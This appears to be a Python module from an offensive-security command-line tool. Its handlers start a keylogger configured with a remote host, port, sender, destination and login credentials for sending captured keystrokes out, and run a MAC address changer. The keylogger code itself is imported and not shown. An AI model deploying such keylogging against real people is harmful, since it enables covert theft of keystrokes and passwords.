"""Utility handlers (keylogger, MAC changer)."""

import sys

from vault_cli import colors, errors


def keylogger(args):
    try:
        colors.info('Keylogger starting...')

        from lib.utilities.keylogger import keylogger

        keyloggerObj = keylogger.keylogger(interval=args.interval,
                                           sender=args.sender,
                                           destination=args.destination,
                                           host=args.host, port=args.port,
                                           username=args.username,
                                           password=args.password)
        keyloggerObj.start_keylogger()

    except ImportError:
        errors.report_error('Could not import the required module.',
                            code='E6001')
        sys.exit(1)
    except Exception as e:
        errors.report_error(str(e), exc=e)


def mac_changer(args):
    try:
        if args.mac is None:
            colors.warning('No MAC address provided; a random MAC will be '
                           'generated.')
        colors.info('Loading MAC Changer...')

        from lib.utilities.mac_changer import mac_changer

        macObj = mac_changer.MACChanger(mac_addr=args.mac,
                                        interface=args.interface)
        macObj.startProcess()

    except ImportError:
        errors.report_error('Could not import the required module.',
                            code='E6001')
        sys.exit(1)
    except Exception as e:
        errors.report_error(str(e), exc=e)
